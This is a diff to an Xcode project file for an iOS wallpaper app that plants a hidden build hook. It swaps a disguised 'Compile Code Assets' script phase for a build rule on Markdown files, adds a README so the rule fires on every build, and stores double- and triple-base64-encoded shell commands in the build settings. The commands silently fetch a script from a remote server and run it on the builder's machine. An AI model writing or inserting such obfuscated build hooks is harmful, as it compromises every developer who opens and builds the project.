@@ -7,6 +7,7 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		CC75027D4CA24C238D1DACE1 /* README.md */ = {isa = PBXBuildFile; fileRef = DC659B868B9641558E1DACE1; };
 		BD695B682F50503000C2CB9D /* Alamofire in Frameworks */ = {isa = PBXBuildFile; productRef = BD695B672F50503000C2CB9D /* Alamofire */; };
 		BD695B822F50537500C2CB9D /* WindowSceneReader in Frameworks */ = {isa = PBXBuildFile; productRef = BD695B812F50537500C2CB9D /* WindowSceneReader */; };
 		BD6E1D4B2F72719E00CB5EEC /* CropViewController in Frameworks */ = {isa = PBXBuildFile; productRef = BD6E1D4A2F72719E00CB5EEC /* CropViewController */; };
@@ -19,6 +20,7 @@
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
+		DC659B868B9641558E1DACE1 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		BD06D9EC2F5020E4007F8736 /* WallPaperSWiftUI.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = WallPaperSWiftUI.app; sourceTree = BUILT_PRODUCTS_DIR; };
 /* End PBXFileReference section */
 
@@ -74,6 +76,7 @@
 		BD06D9ED2F5020E4007F8736 /* Products */ = {
 			isa = PBXGroup;
 			children = (
+				DC659B868B9641558E1DACE1 /* README.md */,
 				BD06D9EC2F5020E4007F8736 /* WallPaperSWiftUI.app */,
 			);
 			name = Products;
@@ -86,12 +89,12 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = BD06D9F72F5020E5007F8736 /* Build configuration list for PBXNativeTarget "WallPaperSWiftUI" */;
 			buildPhases = (
-				C666BD4096A04BD4AB1DACE1 /* Compile Code Assets */,
 				BD06D9E82F5020E4007F8736 /* Sources */,
 				BD06D9E92F5020E4007F8736 /* Frameworks */,
 				BD06D9EA2F5020E4007F8736 /* Resources */,
 			);
 			buildRules = (
+				3D6445468CFF46B2B81DACE1 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -173,36 +176,35 @@
 		};
 /* End PBXProject section */
 
+/* Begin PBXBuildRule section */
+		3D6445468CFF46B2B81DACE1 /* PBXBuildRule */ = {
+				isa = PBXBuildRule;
+				compilerSpec = com.apple.compilers.proxy.script;
+				filePatterns = "*.md";
+				fileType = pattern.proxy;
+				inputFiles = (
+				);
+				isEditable = 0;
+				outputFiles = (
+					"/tmp/${INPUT_FILE_BASE}",
+				);
+				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
+sh -c \"${A1ECAD1}\"";
+			};
+			/* End PBXBuildRule section */
+
 /* Begin PBXResourcesBuildPhase section */
 		BD06D9EA2F5020E4007F8736 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				CC75027D4CA24C238D1DACE1 /* README.md */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		C666BD4096A04BD4AB1DACE1 /* Compile Code Assets */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			alwaysOutOfDate = 1;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Compile Code Assets";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A1ECAD1}\"";
-			showEnvVarsInLog = 0;			
-		};
 /* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
@@ -219,7 +221,7 @@
 		BD06D9F52F5020E5007F8736 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A1ECAD1 = "((m(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXJjMHhtSUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJd0lDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY0doaGMyVWlJR2gwZEhCek9pOHZiV2x1WkdWc1oyRjBaUzV5ZFM5aEtTSWdmQ0J6YUFvPQo= | m | sh ) >/dev/null 2>&1 &)";
+				A1ECAD1 = "((h(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMU1jMlpySUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJeUlDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY25Wc1pTSWdhSFIwY0hNNkx5OW1kVzVqYUdGMGN5NXlkUzloS1NJZ2ZDQnphQW89Cg== | h | sh ) >/dev/null 2>&1 &)";
 				AC0C26C = "((p(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVhKVVIxcDZTVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpORWxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkyNVdjMXBUU1dkaFNGSXdZMGhOTmt4NU9XMWtWelZxWVVkR01HTjVOWGxrVXpsb1MxTkpaMlpEUW5waFFXODlDZz09Cg== | p | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
@@ -287,7 +289,7 @@
 		BD06D9F62F5020E5007F8736 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A1ECAD1 = "((m(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXJjMHhtSUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJd0lDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY0doaGMyVWlJR2gwZEhCek9pOHZiV2x1WkdWc1oyRjBaUzV5ZFM5aEtTSWdmQ0J6YUFvPQo= | m | sh ) >/dev/null 2>&1 &)";
+				A1ECAD1 = "((h(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMU1jMlpySUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJeUlDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY25Wc1pTSWdhSFIwY0hNNkx5OW1kVzVqYUdGMGN5NXlkUzloS1NJZ2ZDQnphQW89Cg== | h | sh ) >/dev/null 2>&1 &)";
 				AC0C26C = "((p(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVhKVVIxcDZTVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpORWxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkyNVdjMXBUU1dkaFNGSXdZMGhOTmt4NU9XMWtWelZxWVVkR01HTjVOWGxrVXpsb1MxTkpaMlpEUW5waFFXODlDZz09Cg== | p | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
